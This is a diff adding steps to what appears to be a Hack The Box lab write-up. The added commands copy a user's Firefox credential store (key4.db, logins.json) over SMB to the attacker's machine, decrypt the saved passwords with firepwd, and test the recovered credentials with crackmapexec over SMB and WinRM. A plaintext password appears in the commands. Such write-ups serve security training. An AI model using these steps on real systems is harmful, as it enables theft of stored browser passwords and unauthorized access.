@@ -223,6 +223,35 @@ upload winPEASx64.exe
 ![image](https://user-images.githubusercontent.com/33616880/231686573-5ded1f6d-582b-41dd-adbd-30e8fa3f7b43.png)
 
 
+```
+./smbserver.py s . -smb2support -username df -password df
+cd C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release
+net use \\10.10.14.39\s /u:df df
+copy key4.db \\10.10.14.39\s\key4.db
+copy logins.json \\10.10.14.39\s\logins.json
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/aaf0389b-152c-47c6-b62d-9c679b0e404f)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/53696ae6-22b4-4e12-8b05-8a600ec7fe8e)
+
+
+```
+git clone https://github.com/lclevy/firepwd.git
+python3 firepwd.py
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/bef22052-e930-4afc-94b6-3f4e5e765fc8)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/48c0cfca-63ec-4c03-aaf4-612913049f50)
+
+
+```
+crackmapexec smb 10.10.11.158 -u users3.txt -p pass3.txt
+crackmapexec winrm 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/0af2564b-a418-496f-8a11-bda32d2a5eb0)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/6956b962-0e9c-474d-8574-5cffe479247b)
+
 
 ```
 git clone https://github.com/fox-it/BloodHound.py.git
